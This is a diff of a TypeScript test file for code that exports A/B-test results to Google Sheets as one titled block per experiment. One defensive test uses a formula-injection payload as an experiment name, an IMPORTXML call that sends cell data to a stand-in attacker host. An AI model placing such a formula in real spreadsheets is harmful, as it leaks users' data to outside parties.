@@ -1,10 +1,12 @@
 import { describe, expect, it } from "vitest";
 
 import {
+  NO_ACTIVITY_NOTE,
   SHEET_COLUMNS,
+  SHEET_WIDTH,
+  type SectionArmFigures,
   armLabel,
-  buildDatedSheetRows,
-  buildSheetRows,
+  buildSheetSections,
   headerRow,
   percentCell,
 } from "@/lib/sheet-rows";
@@ -13,9 +15,9 @@ describe("headerRow", () => {
   it("names the timezone and the unit", () => {
     // Both are the difference between a number a customer can trust and one they have to guess
     // at: the day boundary is UTC, and the rate is a percentage rather than a fraction.
+    // The experiment is named by its block's title row, not repeated on every line.
     expect(headerRow()).toEqual([
       "Date (UTC)",
-      "Experiment",
       "Variant",
       "Visitors",
       "Conversions",
@@ -98,68 +100,140 @@ describe("percentCell", () => {
   });
 });
 
-describe("buildSheetRows", () => {
-  it("emits one row per arm in the order given", () => {
-    const rows = buildSheetRows("2026-09-28", [
-      {
-        experimentName: "Pricing page redesign",
-        variantLabel: "Control",
-        assignedVisitors: 412,
-        conversions: 30,
-        conversionRate: 30 / 412,
-      },
-      {
-        experimentName: "Pricing page redesign",
-        variantLabel: "Variant A",
-        assignedVisitors: 408,
-        conversions: 41,
-        conversionRate: 41 / 408,
-      },
+/** One arm-day of an experiment; everything not given is a plain A/B test's Control on day 1. */
+function arm(over: Partial<SectionArmFigures> = {}): SectionArmFigures {
+  return {
+    day: "2026-10-26",
+    experimentId: "exp_ab",
+    experimentName: "Homepage hero",
+    experimentType: "AB_TEST",
+    experimentStatus: "ACTIVE",
+    experimentCreated: "2026-10-20",
+    variantLabel: "Control",
+    assignedVisitors: 7,
+    conversions: 4,
+    conversionRate: 4 / 7,
+    ...over,
+  };
+}
+const blank = Array.from({ length: SHEET_WIDTH }, () => "");
+const pad = (row: (string | number)[]) => [...row, ...blank].slice(0, SHEET_WIDTH);
+
+describe("buildSheetSections", () => {
+  it("writes one block per experiment: title, headers, rows — and a blank row between", () => {
+    const rows = buildSheetSections([
+      arm(),
+      arm({ variantLabel: "Variant A", assignedVisitors: 2, conversions: 0, conversionRate: 0 }),
+      arm({
+        experimentId: "exp_split",
+        experimentName: "Pricing page",
+        experimentType: "SPLIT_URL",
+        experimentStatus: "PAUSED",
+        experimentCreated: "2026-10-22",
+        assignedVisitors: 1,
+        conversions: 0,
+        conversionRate: 0,
+      }),
     ]);
 
     expect(rows).toEqual([
-      ["2026-09-28", "Pricing page redesign", "Control", 412, 30, 7.3],
-      ["2026-09-28", "Pricing page redesign", "Variant A", 408, 41, 10],
+      pad([
+        "Experiment",
+        "Homepage hero",
+        "Type",
+        "A/B test",
+        "Status",
+        "Running",
+        "Created",
+        "2026-10-20",
+      ]),
+      pad(["Date (UTC)", "Variant", "Visitors", "Conversions", "Conversion Rate (%)"]),
+      pad(["2026-10-26", "Control", 7, 4, 57.1]),
+      pad(["2026-10-26", "Variant A", 2, 0, 0]),
+      blank,
+      pad([
+        "Experiment",
+        "Pricing page",
+        "Type",
+        "Split URL",
+        "Status",
+        "Paused",
+        "Created",
+        "2026-10-22",
+      ]),
+      pad(["Date (UTC)", "Variant", "Visitors", "Conversions", "Conversion Rate (%)"]),
+      pad(["2026-10-26", "Control", 1, 0, 0]),
     ]);
   });
 
-  it("emits counts as numbers, not strings", () => {
+  it("keeps an experiment's rows together even when the input interleaves days and tests", () => {
+    // The query returns day-major rows; the sheet must not interleave experiments.
+    const rows = buildSheetSections([
+      arm({ day: "2026-10-25" }),
+      arm({ day: "2026-10-25", experimentId: "exp_b", experimentName: "Banner" }),
+      arm({ day: "2026-10-26" }),
+      arm({ day: "2026-10-26", experimentId: "exp_b", experimentName: "Banner" }),
+    ]);
+    const titles = rows.filter((row) => row[0] === "Experiment").map((row) => row[1]);
+    expect(titles).toEqual(["Banner", "Homepage hero"]); // by name
+    const heroStart = rows.findIndex((row) => row[1] === "Homepage hero");
+    expect(rows.slice(heroStart + 2).map((row) => row[0])).toEqual(["2026-10-25", "2026-10-26"]);
+  });
+
+  it("tells apart two experiments with the same name, in a stable order", () => {
+    const rows = buildSheetSections([
+      arm({
+        experimentId: "exp_new",
+        experimentCreated: "2026-10-26",
+        experimentType: "SPLIT_URL",
+      }),
+      arm({ experimentId: "exp_old", experimentCreated: "2026-10-01" }),
+    ]);
+    const titles = rows.filter((row) => row[0] === "Experiment");
+    expect(titles.map((row) => [row[1], row[3], row[7]])).toEqual([
+      ["Homepage hero", "A/B test", "2026-10-01"],
+      ["Homepage hero", "Split URL", "2026-10-26"],
+    ]);
+  });
+
+  it("labels every status the way the dashboard does", () => {
+    const status = (experimentStatus: SectionArmFigures["experimentStatus"]) =>
+      buildSheetSections([arm({ experimentStatus })])[0]![5];
+    expect([status("ACTIVE"), status("PAUSED"), status("COMPLETED"), status("DRAFT")]).toEqual([
+      "Running",
+      "Paused",
+      "Completed",
+      "Draft",
+    ]);
+  });
+
+  it("pads every row to the full width, so an earlier layout's cells cannot linger", () => {
+    const rows = buildSheetSections([arm(), arm({ experimentId: "exp_2", experimentName: "Z" })]);
+    expect(rows.every((row) => row.length === SHEET_WIDTH)).toBe(true);
+  });
+
+  it("emits counts and rates as numbers, not strings", () => {
     // A quoted "412" lands in Sheets as text, and text does not sum — which is the entire
     // reason a customer wants this in a spreadsheet.
-    const [row] = buildSheetRows("2026-09-28", [
-      {
-        experimentName: "Checkout",
-        variantLabel: "Control",
-        assignedVisitors: 412,
-        conversions: 30,
-        conversionRate: 0.073,
-      },
-    ]);
-
-    expect(typeof row?.[3]).toBe("number");
-    expect(typeof row?.[4]).toBe("number");
-    expect(typeof row?.[5]).toBe("number");
+    const data = buildSheetSections([
+      arm({ assignedVisitors: 412, conversions: 30, conversionRate: 0.073 }),
+    ])[2]!;
+    expect(data.slice(2, 5)).toEqual([412, 30, 7.3]);
+    expect(data.slice(2, 5).every((cell) => typeof cell === "number")).toBe(true);
   });
 
   it("writes an arm that saw no traffic as zeroes with a blank rate", () => {
-    // Kept rather than dropped: otherwise a variant that got nothing yesterday vanishes and
-    // control looks like the whole test.
-    const rows = buildSheetRows("2026-09-28", [
-      {
-        experimentName: "Checkout",
-        variantLabel: "Variant B",
-        assignedVisitors: 0,
-        conversions: 0,
-        conversionRate: null,
-      },
-    ]);
-
-    expect(rows).toEqual([["2026-09-28", "Checkout", "Variant B", 0, 0, ""]]);
+    // Kept rather than dropped: otherwise a variant that got nothing vanishes and control looks
+    // like the whole test.
+    const data = buildSheetSections([
+      arm({ variantLabel: "Variant B", assignedVisitors: 0, conversions: 0, conversionRate: null }),
+    ])[2]!;
+    expect(data.slice(0, 5)).toEqual(["2026-10-26", "Variant B", 0, 0, ""]);
   });
 
   it("passes a name that looks like a formula through untouched", () => {
     /*
-     * The defence against stored-formula injection is `valueInputOption=RAW` on the append, not
+     * The defence against stored-formula injection is `valueInputOption=RAW` on the write, not
      * escaping here — under RAW, Sheets stores this as the string it is. Mangling the name would
      * be visible in the customer's spreadsheet and would not make anything safer.
      *
@@ -167,70 +241,10 @@ describe("buildSheetRows", () => {
      * USER_ENTERED, fails here and gets read alongside this comment.
      */
     const hostile = `=IMPORTXML("http://attacker.test/?c="&A1,"//x")`;
-    const [row] = buildSheetRows("2026-09-28", [
-      {
-        experimentName: hostile,
-        variantLabel: "Control",
-        assignedVisitors: 1,
-        conversions: 0,
-        conversionRate: 0,
-      },
-    ]);
-
-    expect(row?.[1]).toBe(hostile);
+    expect(buildSheetSections([arm({ experimentName: hostile })])[0]![1]).toBe(hostile);
   });
 
-  it("returns nothing for a day with no arms", () => {
-    expect(buildSheetRows("2026-09-28", [])).toEqual([]);
-  });
-});
-
-describe("buildDatedSheetRows", () => {
-  it("carries each row's own day", () => {
-    const rows = buildDatedSheetRows([
-      {
-        day: "2026-09-28",
-        experimentName: "Checkout",
-        variantLabel: "Control",
-        assignedVisitors: 10,
-        conversions: 1,
-        conversionRate: 0.1,
-      },
-      {
-        day: "2026-09-29",
-        experimentName: "Checkout",
-        variantLabel: "Control",
-        assignedVisitors: 4,
-        conversions: 0,
-        conversionRate: 0,
-      },
-    ]);
-
-    expect(rows).toEqual([
-      ["2026-09-28", "Checkout", "Control", 10, 1, 10],
-      ["2026-09-29", "Checkout", "Control", 4, 0, 0],
-    ]);
-  });
-
-  it("preserves the order it is given", () => {
-    // The tab is overwritten wholesale, so row order is entirely the caller's and must not be
-    // re-sorted here — oldest day first is what makes the sheet read as a report.
-    const days = ["2026-09-01", "2026-09-02", "2026-09-03"];
-    const rows = buildDatedSheetRows(
-      days.map((day) => ({
-        day,
-        experimentName: "E",
-        variantLabel: "Control",
-        assignedVisitors: 1,
-        conversions: 0,
-        conversionRate: 0,
-      })),
-    );
-
-    expect(rows.map((row) => row[0])).toEqual(days);
-  });
-
-  it("returns nothing for an empty window", () => {
-    expect(buildDatedSheetRows([])).toEqual([]);
+  it("says so, in one row, when nothing happened in the window", () => {
+    expect(buildSheetSections([])).toEqual([pad([NO_ACTIVITY_NOTE])]);
   });
 });
